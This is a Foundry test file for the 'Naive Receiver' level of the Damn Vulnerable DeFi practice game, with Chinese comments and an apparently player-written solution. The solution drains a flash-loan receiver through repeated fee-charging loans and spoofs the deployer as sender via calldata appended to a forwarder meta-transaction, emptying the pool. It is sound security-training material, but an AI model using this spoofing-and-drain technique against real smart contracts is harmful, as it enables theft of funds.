// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;
    event log_Data(bytes);
    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        //玩家
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        //token
        weth = new WETH();

        // Deploy forwarder
        //转发器
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        //池子构造参数
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        //接收者
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        //接收者10个weth。
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        //抛出预期错误。调用这个onflashloan的msgsender只能是闪电贷合约。
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {

        bytes[] memory calldatas=new bytes[](11);
        //10次闪电贷

        for(uint256 i=0;i<10;i++){
            calldatas[i]=abi.encodeCall(NaiveReceiverPool.flashLoan,(receiver,address(weth),0,"0x"));
        }
        //取钱
        calldatas[10]=abi.encodePacked(abi.encodeCall(pool.withdraw,(1010 ether,payable(recovery))),
            bytes32(uint256(uint160(address(deployer)))));
        //批量调用
        bytes memory calldatass=abi.encodeCall(pool.multicall,calldatas);
        emit log_Data(calldatass);
        BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: 300000000,
        nonce: forwarder.nonces(player),
        data: calldatass,
        deadline: block.timestamp + 1000000
        });
        //构造签名
        bytes32 requestHash=forwarder.getDataHash(request);
        bytes32 requestHashs = keccak256(
                abi.encodePacked(
                    "\x19\x01",
                    forwarder.domainSeparator(),
                    requestHash
                )
            );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHashs);
        bytes memory signatures = abi.encodePacked(r, s, v); 
        //执行攻击
        forwarder.execute{value:0 ether }(request, signatures);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        //玩家只执行了两个或更少的交易
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        //接收者合约中没有资金
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        //池子中没有资金
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        //所有资金在接收者合约中
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
